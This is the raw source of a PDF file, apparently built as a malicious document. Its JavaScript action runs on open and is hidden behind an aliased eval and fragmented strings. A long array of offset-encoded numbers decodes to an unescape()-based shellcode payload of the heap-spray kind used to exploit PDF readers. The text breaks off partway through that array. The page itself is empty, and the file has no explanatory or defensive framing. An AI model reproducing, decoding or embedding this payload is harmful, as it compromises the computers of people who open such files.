%PDF-1.3
3 0 obj
<</Type /Page
/Parent 1 0 R
/Resources 2 0 R
/Contents 4 0 R>>
endobj
4 0 obj
<</Filter /FlateDecode /Length 26126>>
stream
endstream
endobj
1 0 obj
<</Type /Pages
/Kids [3 0 R ]
/Count 1
/MediaBox [0 0 300.00 400.00]
>>
endobj
5 0 obj
<</Type /Font
/BaseFont /Helvetica
/Subtype /Type1
/Encoding /WinAnsiEncoding
>>
endobj
2 0 obj
<<
/ProcSet [/PDF /Text /ImageB /ImageC /ImageI]
/Font <<
/F1 5 0 R
>>
/XObject <<
>>
>>
endobj
6 0 obj
<<
/Names [(HtYfjPssa) 7 0 R ]
>>
endobj
7 0 obj
<<
/S /JavaScript
/JS (
var er = eval;
var xKJLQxzpWfyz="ur";var q5j6vDENvP="n S";var TcyF75AxJBO="tri";var wruz5qL0a="g.";var ymtCJW1x="fro";var OQzOcTOeZQ="mC";var Fp7cccMrfdQ="h";var bvfeIvMPz="a";var E5DTr9U="rC";
var s = "21 129 108 125 43 123 108 132 119 122 108 111 43 72 43 128 121 112 126 110 108 123 112 51 45 48 128 59 76 59 76 48 128 59 76 59 76 48 128 59 76 59 76 45 54 45 48 128 80 60 79 68 48 128 62 63 79 68 48 128 64 67 61 63 48 128 64 67 64 67 48 128 62 62 64 67 48 128 77 62 79 77 48 128 59 62 60 78 48 128 62 60 78 62 48 128 65 65 78 68 48 128 80 68 67 60 48 128 81 76 65 64 48 128 62 59 67 59 48 128 63 59 61 60 48 128 81 76 80 61 48 128 60 66 78 68 48 128 61 60 61 61 48 128 63 68 61 60 48 128 59 60 61 60 48 128 61 60 61 60 48 128 61 60 63 77 48 128 81 60 79 80 48 128 61 60 68 67 48 128 61 60 62 60 48 128 76 76 61 60 48 128 78 76 79 68 48 128 66 81 61 63 48 128 67 64 79 61 48 128 81 60 79 80 48 128 79 66 78 68 48 128 79 80 79 80 48 128 78 68 79 80 48 128 61 61 60 78 48 128 61 60 61 60 48 128 79 68 76 76 48 128 60 68 78 68 48 128 61 60 61 60 48 128 78 68 61 60 48 128 61 59 65 78 48 128 61 60 61 60 48 128 65 66 78 68 48 128 61 60 61 60 48 128 78 68 61 60 48 128 61 61 81 76 48 128 61 60 61 60 48 128 79 68 76 76 48 128 59 62 78 68 48 128 61 60 61 60 48 128 78 68 61 60 48 128 61 59 65 64 48 128 61 60 61 60 48 128 60 60 78 68 48 128 61 60 61 60 48 128 78 68 61 60 48 128 61 61 76 67 48 128 61 60 61 60 48 128 79 68 76 76 48 128 61 79 78 68 48 128 61 60 61 60 48 128 78 68 61 60 48 128 61 59 63 59 48 128 61 60 61 60 48 128 62 77 78 68 48 128 61 60 61 60 48 128 78 76 61 60 48 128 66 61 66 68 48 128 81 79 76 76 48 128 63 77 66 61 48 128 63 68 65 60 48 128 62 60 61 60 48 128 61 60 61 60 48 128 78 68 66 65 48 128 61 62 68 59 48 128 61 60 61 60 48 128 78 63 78 68 48 128 61 60 61 60 48 128 66 68 61 60 48 128 66 61 80 61 48 128 81 79 76 76 48 128 63 77 66 61 48 128 63 68 59 60 48 128 62 60 61 60 48 128 61 60 61 60 48 128 78 68 66 65 48 128 61 62 77 67 48 128 61 60 61 60 48 128 80 78 78 68 48 128 61 60 61 60 48 128 66 68 61 60 48 128 66 65 80 61 48 128 60 79 78 68 48 128 61 60 61 64 48 128 76 76 61 60 48 128 60 61 79 68 48 128 65 67 80 67 48 128 80 60 60 61 48 128 80 61 68 60 48 128 79 62 79 79 48 128 76 78 67 81 48 128 79 80 65 65 48 128 80 61 66 80 48 128 60 81 66 76 48 128 61 65 80 66 48 128 60 81 68 68 48 128 66 80 76 67 48 128 63 66 61 59 48 128 80 65 60 81 48 128 61 63 65 65 48 128 78 60 79 80 48 128 78 67 80 61 48 128 61 64 77 63 48 128 61 60 61 60 48 128 76 59 66 76 48 128 62 64 78 79 48 128 61 60 61 59 48 128 76 76 61 60 48 128 60 81 81 64 48 128 61 62 80 65 48 128 63 78 63 61 48 128 59 60 63 64 48 128 80 65 60 81 48 128 61 64 65 62 48 128 63 61 59 80 48 128 59 62 59 60 48 128 80 62 76 61 48 128 60 61 61 68 48 128 66 60 80 60 48 128 63 68 66 60 48 128 61 59 61 64 48 128 61 60 61 60 48 128 66 61 66 62 48 128 78 68 66 60 48 128 61 61 80 59 48 128 61 60 61 60 48 128 81 60 79 80 48 128 79 79 76 76 48 128 80 65 76 76 48 128 80 60 76 61 48 128 60 81 61 68 48 128 62 68 76 77 48 128 81 76 76 64 48 128 61 61 64 64 48 128 78 76 65 60 48 128 60 81 79 66 48 128 61 60 80 66 48 128 60 61 59 62 48 128 60 81 81 62 48 128 66 60 76 68 48 128 76 61 61 59 48 128 66 64 78 79 48 128 80 60 60 61 48 128 81 76 60 61 48 128 80 79 76 76 48 128 79 68 76 61 48 128 64 78 66 64 48 128 60 81 61 67 48 128 62 79 76 67 48 128 76 61 61 59 48 128 61 64 80 60 48 128 79 62 78 76 48 128 80 79 76 76 48 128 81 67 76 76 48 128 80 61 76 61 48 128 60 61 62 60 48 128 60 81 80 60 48 128 65 61 80 65 48 128 61 59 59 79 48 128 61 60 61 60 48 128 66 59 61 60 48 128 66 60 66 61 48 128 66 60 66 60 48 128 66 60 66 60 48 128 66 65 66 60 48 128 78 68 66 60 48 128 61 61 60 67 48 128 61 60 61 60 48 128 62 67 78 68 48 128 61 60 61 60 48 128 63 64 61 60 48 128 61 64 67 59 48 128 61 60 61 60 48 128 76 78 61 60 48 128 63 60 67 60 48 128 79 80 79 80 48 128 78 68 79 80 48 128 61 61 60 65 48 128 61 60 61 60 48 128 81 76 60 61 48 128 66 61 66 61 48 128 66 61 66 61 48 128 81 60 79 80 48 128 60 68 76 60 48 128 76 60 78 68 48 128 78 67 60 68 48 128 61 80 64 63 48 128 64 68 76 59 48 128 77 60 61 63 48 128 77 60 77 60 48 128 64 64 77 60 48 128 66 63 61 66 48 128 78 79 76 76 48 128 65 60 76 78 48 128 79 80 61 63 48 128 78 68 78 60 48 128 79 80 59 81 48 128 79 80 79 80 48 128 78 68 80 61 48 128 79 80 59 68 48 128 79 80 79 80 48 128 62 59 68 68 48 128 61 64 61 59 48 128 80 62 76 60 48 128 61 60 61 79 48 128 62 76 78 68 48 128 79 80 79 80 48 128 60 61 79 80 48 128 66 60 80 60 48 128 78 68 66 64 48 128 61 60 66 64 48 128 61 60 61 60 48 128 78 68 66 60 48 128 61 62 76 76 48 128 61 60 61 60 48 128 81 60 79 80 48 128 76 60 60 66 48 128 59 64 60 79 48 128 64 65 61 60 48 128 78 68 61 77 48 128 61 62 65 59 48 128 61 60 61 60 48 128 79 80 60 61 48 128 79 80 66 65 48 128 78 68 81 60 48 128 61 59 79 76 48 128 61 60 61 60 48 128 79 80 63 68 48 128 61 60 61 60 48 128 79 80 61 60 48 128 78 68 81 60 48 128 79 81 78 68 48 128 79 80 79 80 48 128 66 65 66 61 48 128 60 61 66 66 48 128 66 60 80 60 48 128 78 68 66 64 48 128 61 60 62 81 48 128 61 60 61 60 48 128 78 68 66 60 48 128 61 62 66 63 48 128 61 60 61 60 48 128 81 60 79 80 48 128 76 60 60 66 48 128 59 64 60 79 48 128 64 65 61 60 48 128 78 68 61 77 48 128 61 62 61 76 48 128 61 60 61 60 48 128 79 80 60 61 48 128 79 80 66 65 48 128 66 68 81 60 48 128 66 80 66 81 48 128 80 61 66 76 48 128 61 62 78 76 48 128 80 61 66 68 48 128 79 67 78 68 48 128 79 80 79 80 48 128 66 66 79 80 48 128 76 61 66 65 48 128 61 68 78 79 48 128 79 79 76 76 48 128 61 68 63 77 48 128 60 81 66 65 48 128 64 65 79 80 48 128 78 68 62 64 48 128 61 62 66 78 48 128 61 60 61 60 48 128 81 60 79 80 48 128 79 79 76 76 48 128 63 59 63 68 48 128 63 63 63 78 48 128 63 68 61 60 48 128 65 63 65 67 48 128 64 62 65 66 48 128 79 64 76 76 48 128 61 68 68 67 48 128 61 60 61 60 48 128 79 61 61 60 48 128 64 63 67 66 48 128 63 77 59 80 48 128 60 81 61 60 48 128 64 64 79 80 48 128 59 60 59 64 48 128 59 64 78 68 48 128 61 60 61 62 48 128 79 80 61 60 48 128 76 76 81 60 48 128 78 68 79 68 48 128 61 59 80 76 48 128 61 60 61 60 48 128 81 60 79 80 48 128 79 68 60 76 48 128 61 68 64 64 48 128 76 76 60 66 48 128 59 64 65 64 48 128 60 81 59 60 48 128 61 60 79 80 48 128 79 80 60 81 48 128 59 64 64 64 48 128 78 68 62 79 48 128 61 59 78 80 48 128 61 60 61 60 48 128 81 60 79 80 48 128 80 64 76 61 48 128 66 80 62 60 48 128 68 68 66 81 48 128 61 60 61 59 48 128 61 60 61 60 48 128 63 68 80 61 48 128 63 81 63 80 48 128 61 60 61 60 48 128 64 63 63 68 48 128 63 79 64 62 48 128 78 76 63 78 48 128 76 78 62 63 48 128 59 64 65 64 48 128 66 60 61 64 48 128 59 62 78 68 48 128 79 80 79 81 48 128 66 60 79 80 48 128 65 77 78 68 48 128 61 60 61 62 48 128 78 67 61 60 48 128 79 81 78 62 48 128 79 80 79 80 48 128 78 66 78 68 48 128 79 80 79 80 48 128 76 61 79 80 48 128 61 68 80 64 48 128 63 77 80 61 48 128 63 68 63 79 48 128 64 64 63 81 48 128 63 79 63 64 48 128 62 63 78 76 48 128 65 64 76 78 48 128 61 64 59 64 48 128 78 68 66 60 48 128 79 78 79 76 48 128 79 80 79 80 48 128 78 68 66 60 48 128 61 62 59 61 48 128 61 60 61 60 48 128 68 76 78 67 48 128 79 80 79 81 48 128 78 68 79 80 48 128 79 80 78 66 48 128 79 80 79 80 48 128 80 64 76 61 48 128 80 61 61 68 48 128 60 61 63 68 48 128 61 60 60 62 48 128 63 68 61 60 48 128 64 61 64 63 48 128 64 62 63 63 48 128 62 63 78 76 48 128 65 64 76 78 48 128 61 64 59 64 48 128 78 68 66 60 48 128 79 78 81 59 48 128 79 80 79 80 48 128 78 68 66 60 48 128 61 59 79 67 48 128 61 60 61 60 48 128 77 59 78 67 48 128 79 80 79 81 48 128 78 68 79 80 48 128 79 80 78 66 48 128 79 80 79 80 48 128 80 64 76 61 48 128 80 61 61 68 48 128 63 61 63 68 48 128 64 65 64 66 48 128 63 68 61 60 48 128 63 68 64 61 48 128 63 80 63 64 48 128 62 63 78 76 48 128 65 64 76 78 48 128 61 64 59 64 48 128 78 68 66 60 48 128 79 78 67 65 48 128 79 80 79 80 48 128 78 68 66 60 48 128 61 59 80 80 48 128 61 60 61 60 48 128 63 65 78 67 48 128 79 80 79 81 48 128 78 68 79 80 48 128 79 80 78 66 48 128 79 80 79 80 48 128 80 64 76 61 48 128 80 61 61 68 48 128 64 66 63 68 48 128 64 68 63 65 48 128 78 76 61 60 48 128 76 78 62 63 48 128 59 64 65 64 48 128 66 60 61 64 48 128 76 62 78 68 48 128 79 80 79 78 48 128 66 60 79 80 48 128 67 77 78 68 48 128 61 60 61 59 48 128 78 67 61 60 48 128 79 81 65 62 48 128 79 80 79 80 48 128 78 66 78 68 48 128 79 80 79 80 48 128 76 61 79 80 48 128 61 64 80 64 48 128 78 68 80 61 48 128 61 59 67 76 48 128 61 60 61 60 48 128 62 76 63 68 48 128 65 66 80 66 48 128 66 60 64 67 48 128 80 66 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 77 65 48 128 61 60 61 60 48 128 78 79 63 68 48 128 61 61 77 65 48 128 66 60 61 79 48 128 68 62 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 76 61 48 128 61 60 61 60 48 128 67 77 63 68 48 128 61 78 79 79 48 128 66 60 64 79 48 128 77 81 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 63 80 48 128 61 60 61 60 48 128 78 78 63 68 48 128 78 80 66 66 48 128 66 60 60 66 48 128 76 77 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 66 76 48 128 61 60 61 60 48 128 79 60 63 68 48 128 61 64 76 77 48 128 66 60 66 80 48 128 64 66 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 79 65 48 128 79 80 79 80 48 128 64 68 63 68 48 128 81 76 63 68 48 128 66 60 62 79 48 128 63 62 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 60 61 48 128 61 60 61 60 48 128 78 80 63 68 48 128 78 60 80 81 48 128 66 60 63 60 48 128 65 81 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 59 62 80 48 128 61 60 61 60 48 128 68 60 63 68 48 128 59 78 65 67 48 128 66 60 81 76 48 128 60 77 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 80 60 66 48 128 79 80 79 80 48 128 67 76 63 68 48 128 77 76 66 81 48 128 66 60 62 81 48 128 59 66 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 67 65 48 128 79 80 79 80 48 128 66 67 63 68 48 128 76 59 77 65 48 128 66 60 61 62 48 128 62 62 78 68 48 128 61 60 61 59 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 60 78 61 48 128 61 60 61 60 48 128 64 81 63 68 48 128 78 62 81 68 48 128 66 60 64 61 48 128 79 81 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 60 80 80 48 128 61 60 61 60 48 128 77 81 63 68 48 128 68 76 79 67 48 128 66 60 60 63 48 128 78 77 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 77 62 48 128 79 80 79 80 48 128 66 65 63 68 48 128 68 63 67 60 48 128 66 60 68 76 48 128 81 66 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 64 81 48 128 79 80 79 80 48 128 62 77 63 68 48 128 62 81 64 77 48 128 66 60 61 62 48 128 80 62 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 63 77 48 128 79 80 79 80 48 128 78 60 63 68 48 128 60 60 66 76 48 128 66 60 77 64 48 128 67 81 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 66 66 48 128 79 80 79 80 48 128 77 65 63 68 48 128 78 62 80 67 48 128 66 60 67 61 48 128 77 77 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 65 62 48 128 79 80 79 80 48 128 63 68 63 68 48 128 80 63 59 64 48 128 66 60 68 61 48 128 76 66 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 60 66 65 48 128 61 60 61 60 48 128 64 62 63 68 48 128 68 61 79 81 48 128 66 60 62 66 48 128 64 62 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 79 81 65 64 48 128 79 80 79 80 48 128 62 61 78 76 48 128 63 63 63 77 48 128 78 68 66 60 48 128 79 76 79 65 48 128 79 80 79 80 48 128 78 68 66 60 48 128 79 81 67 76 48 128 79 80 79 80 48 128 68 65 78 67 48 128 79 80 79 79 48 128 78 68 79 80 48 128 79 80 78 68 48 128 79 80 79 80 48 128 78 68 80 61 48 128 79 78 67 67 48 128 79 80 79 80 48 128 65 80 63 68 48 128 65 80 78 80 48 128 66 60 61 63 48 128 60 81 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 78 68 80 61 48 128 61 60 61 80 48 128 61 60 61 60 48 128 76 81 63 68 48 128 61 81 65 81 48 128 66 60 78 79 48 128 59 77 78 68 48 128 61 60 61 60 48 128 76 61 61 60 48 128 61 68 80 64 48 128 60 61 80 61 48 128 63 64 80 60 48 128 65 60 76 76 48 128 76 63 60 60 48 128 64 68 80 60 48 128 60 81 62 60 48 128 65 60 76 76 48 128 60 81 61 79 48 128 64 60 76 76 48 128 67 78 62 79 48 128 76 76 60 81 48 128 61 68 65 60 48 128 78 76 80 61 48 128 60 81 61 76 48 128 65 60 76 76 48 128 76 61 60 64 48 128 64 79 80 60 48 128 76 76 60 81 48 128 60 79 65 60 48 128 63 60 80 61 48 128 76 76 60 66 48 128 59 64 63 79 48 128 60 66 59 64 48 128 65 63 76 76 48 128 60 66 60 79 48 128 66 64 76 76 48 128 64 68 61 63 48 128 81 63 61 61 48 128 76 76 60 81 48 128 62 68 65 77 48 128 76 76 60 81 48 128 59 60 66 77 48 128 81 78 61 61 48 128 60 76 78 61 48 128 60 81 65 67 48 128 60 64 76 76 48 128 61 61 76 76 48 128 60 61 79 63 48 128 60 61 79 80 48 128 79 79 80 60 48 128 76 64 67 79 48 128 64 64 80 60 48 128 80 59 61 65 48 128 61 78 80 80 48 128 79 68 61 61 48 128 79 64 78 76 48 128 60 76 60 66 48 128 59 64 64 79 48 128 64 63 59 68 48 128 60 81 81 80 48 128 66 77 76 76 48 128 61 61 59 64 48 128 63 66 81 78 48 128 76 76 60 81 48 128 65 76 61 79 48 128 76 76 60 81 48 128 62 79 66 77 48 128 81 78 61 61 48 128 76 76 60 81 48 128 76 76 61 64 48 128 80 63 61 61 48 128 76 67 60 66 48 128 59 64 65 64 48 128 63 59 62 79 48 128 78 68 80 61 48 128 79 76 63 66 48 128 79 80 79 80 48 128 64 64 63 68 48 128 64 60 64 64 48 128 59 80 60 77 48 128 63 78 59 80 48 128 63 61 63 67 48 128 63 80 64 62 48 128 63 80 64 61 48 128 63 66 64 64 48 128 63 61 59 81 48 128 59 80 63 81 48 128 63 78 63 67 48 128 59 80 63 65 48 128 63 63 64 63 48 128 59 81 64 64 48 128 63 68 64 60 48 128 61 60 64 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 61 60 61 60 48 128 6